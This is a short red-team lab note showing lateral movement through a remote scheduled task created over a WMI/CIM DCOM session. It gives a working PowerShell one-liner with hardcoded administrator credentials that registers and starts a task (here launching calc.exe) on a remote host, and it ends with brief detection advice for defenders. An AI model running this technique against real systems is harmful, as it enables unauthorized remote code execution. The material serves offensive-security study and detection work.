# WMI via NewScheduledTask

## Execution

On the victim system, let's run a simple loop to see when a new scheduled task gets added:

```csharp
$a=$null; while($a -eq $null) { $a=Get-ScheduledTask | Where-Object {$_.TaskName -eq "lateral"}; $a }
```

{% code-tabs %}
{% code-tabs-item title="attacker@remote" %}
```csharp
$connection = New-Cimsession -ComputerName "dc-mantvydas" -SessionOption (New-CimSessionOption -Protocol "DCOM") -Credential ((new-object -typename System.Management.Automation.PSCredential -ArgumentList @("administrator", (ConvertTo-SecureString -String "123456" -asplaintext -force)))) -ErrorAction Stop; register-scheduledTask -action (New-ScheduledTaskAction -execute "calc.exe" -cimSession $connection -WorkingDirectory "c:\windows\system32") -cimSession $connection -taskname "lateral"; start-scheduledtask -CimSession $connection -TaskName "lateral"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/peek-2018-10-19-22-24.gif)

## Observations

As usual, services.exe spawning interesting binaries should raise suspicion. As a defender, you may want to also consider monitoring unusual scheduled tasks that get created.

![](../.gitbook/assets/screenshot-from-2018-10-19-22-35-13.png)

